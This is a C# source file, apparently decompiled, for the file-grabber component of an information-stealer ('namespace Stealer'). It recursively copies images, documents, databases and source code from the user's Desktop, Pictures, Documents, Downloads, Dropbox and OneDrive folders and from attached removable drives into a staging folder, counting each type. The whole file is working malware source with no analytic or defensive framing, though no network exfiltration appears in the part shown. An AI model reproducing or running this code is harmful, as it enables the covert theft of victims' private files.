using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using RFStub;

namespace Stealer;

internal sealed class FileGrabber
{
	private static string SavePath = "Grabber";

	private static List<string> TargetDirs = new List<string>
	{
		Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
		Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
		Environment.GetFolderPath(Environment.SpecialFolder.Personal),
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "DropBox"),
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "OneDrive")
	};

	private static string RecordFileType(string type)
	{
		switch (type)
		{
		case "Image":
			Counter.GrabberImages++;
			break;
		case "SourceCode":
			Counter.GrabberSourceCodes++;
			break;
		case "DataBase":
			Counter.GrabberDatabases++;
			break;
		case "Document":
			Counter.GrabberDocuments++;
			break;
		}
		return type;
	}

	private static string DetectFileType(string ExtensionName)
	{
		string text = ExtensionName.Replace(".", "").ToLower();
		foreach (KeyValuePair<string, string[]> grabberFileType in Config.GrabberFileTypes)
		{
			string[] value = grabberFileType.Value;
			foreach (string value2 in value)
			{
				if (text.Equals(value2))
				{
					return RecordFileType(grabberFileType.Key);
				}
			}
		}
		return null;
	}

	private static void GrabFile(string path)
	{
		FileInfo fileInfo = new FileInfo(path);
		if (fileInfo.Length > Config.GrabberSizeLimit)
		{
			return;
		}
		string text = DetectFileType(fileInfo.Extension);
		if (text != null)
		{
			string text2 = Path.Combine(SavePath, Path.GetDirectoryName(path)!.Replace(Path.GetPathRoot(path), "DRIVE-" + Path.GetPathRoot(path)!.Replace(":", "")));
			string destFileName = Path.Combine(text2, fileInfo.Name);
			if (!Directory.Exists(text2))
			{
				Directory.CreateDirectory(text2);
			}
			fileInfo.CopyTo(destFileName, overwrite: true);
		}
	}

	private static void GrabDirectory(string path)
	{
		if (!Directory.Exists(path))
		{
			return;
		}
		string[] directories;
		string[] files;
		try
		{
			directories = Directory.GetDirectories(path);
			files = Directory.GetFiles(path);
		}
		catch (UnauthorizedAccessException)
		{
			return;
		}
		catch (AccessViolationException)
		{
			return;
		}
		string[] array = files;
		foreach (string path2 in array)
		{
			GrabFile(path2);
		}
		string[] array2 = directories;
		foreach (string path3 in array2)
		{
			try
			{
				GrabDirectory(path3);
			}
			catch
			{
			}
		}
	}

	public static void Run(string sSavePath)
	{
		try
		{
			SavePath = sSavePath;
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.DriveType == DriveType.Removable && driveInfo.IsReady)
				{
					TargetDirs.Add(driveInfo.RootDirectory.FullName);
				}
			}
			if (!Directory.Exists(SavePath))
			{
				Directory.CreateDirectory(SavePath);
			}
			List<Thread> list = new List<Thread>();
			foreach (string dir in TargetDirs)
			{
				try
				{
					list.Add(new Thread((ThreadStart)delegate
					{
						GrabDirectory(dir);
					}));
				}
				catch
				{
				}
			}
			foreach (Thread item in list)
			{
				item.Start();
			}
			foreach (Thread item2 in list)
			{
				if (item2.IsAlive)
				{
					item2.Join();
				}
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
	}
}
